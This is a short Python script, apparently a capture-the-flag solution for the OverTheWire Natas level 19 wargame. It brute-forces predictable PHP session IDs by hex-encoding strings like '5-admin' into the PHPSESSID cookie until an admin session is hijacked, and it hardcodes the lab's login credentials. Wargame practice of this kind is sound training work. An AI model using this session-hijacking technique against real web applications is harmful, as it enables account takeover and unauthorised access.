# Overthewire: Natas 19
# woanmeo11

import requests
from binascii import hexlify


url = 'http://natas19.natas.labs.overthewire.org/'
account = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(640):
    print(i, end=': ', flush=True)

    payload = hexlify(f'{i}-admin'.encode()).decode()
    r = requests.post(url, auth=account, data={'admin': 'a'}, cookies=dict(PHPSESSID = payload))
    
    if 'regular user' in r.text:
        print('fail')
    else:
        print('ok')
        print(r.text)
        break
